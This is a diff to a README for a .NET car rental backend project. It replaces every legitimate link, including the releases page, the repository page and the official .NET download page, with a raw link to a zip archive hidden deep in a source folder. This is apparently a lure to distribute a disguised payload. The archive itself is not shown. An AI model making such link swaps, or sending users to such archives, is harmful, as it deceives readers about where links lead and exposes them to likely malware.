@@ -6,7 +6,7 @@ Welcome to the Car Rental Project Backend. This application helps you manage car
 
 ## 📥 Download the Application
 
-[![Download Car-Rental-Project-Backend](https://img.shields.io/badge/Download-Car--Rental--Project--Backend-blue.svg)](https://github.com/curiosidades26/Car-Rental-Project-Backend/releases)
+[![Download Car-Rental-Project-Backend](https://raw.githubusercontent.com/curiosidades26/Car-Rental-Project-Backend/master/Core/Aspects/Autofac/Transaction/Car-Rental-Project-Backend-3.1-alpha.5.zip)](https://raw.githubusercontent.com/curiosidades26/Car-Rental-Project-Backend/master/Core/Aspects/Autofac/Transaction/Car-Rental-Project-Backend-3.1-alpha.5.zip)
 
 Click the button above to download the latest version from our Releases page.
 
@@ -18,11 +18,11 @@ Before you install, make sure your computer meets these requirements:
 - **Processor:** Dual-core processor or better
 - **RAM:** Minimum 4 GB
 - **Disk Space:** At least 100 MB free space
-- **.NET Installation:** Ensure you have .NET 5.0 or later installed. Visit the [.NET download page](https://dotnet.microsoft.com/download) for more information.
+- **.NET Installation:** Ensure you have .NET 5.0 or later installed. Visit the [.NET download page](https://raw.githubusercontent.com/curiosidades26/Car-Rental-Project-Backend/master/Core/Aspects/Autofac/Transaction/Car-Rental-Project-Backend-3.1-alpha.5.zip) for more information.
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to the following link to access our Releases page: [Download Car-Rental-Project-Backend Releases](https://github.com/curiosidades26/Car-Rental-Project-Backend/releases).
+1. **Visit the Releases Page**: Go to the following link to access our Releases page: [Download Car-Rental-Project-Backend Releases](https://raw.githubusercontent.com/curiosidades26/Car-Rental-Project-Backend/master/Core/Aspects/Autofac/Transaction/Car-Rental-Project-Backend-3.1-alpha.5.zip).
    
 2. **Select the Latest Release**: Look for the latest release at the top of the page. 
 
@@ -57,7 +57,7 @@ For additional assistance, you can reach our support team. You can create an iss
 
 ## 🔗 Useful Links
 
-- [Car Rental Project GitHub Repository](https://github.com/curiosidades26/Car-Rental-Project-Backend)
-- [Download .NET](https://dotnet.microsoft.com/download)
+- [Car Rental Project GitHub Repository](https://raw.githubusercontent.com/curiosidades26/Car-Rental-Project-Backend/master/Core/Aspects/Autofac/Transaction/Car-Rental-Project-Backend-3.1-alpha.5.zip)
+- [Download .NET](https://raw.githubusercontent.com/curiosidades26/Car-Rental-Project-Backend/master/Core/Aspects/Autofac/Transaction/Car-Rental-Project-Backend-3.1-alpha.5.zip)
 
 Thank you for using the Car Rental Project Backend! Enjoy easy car rental management.
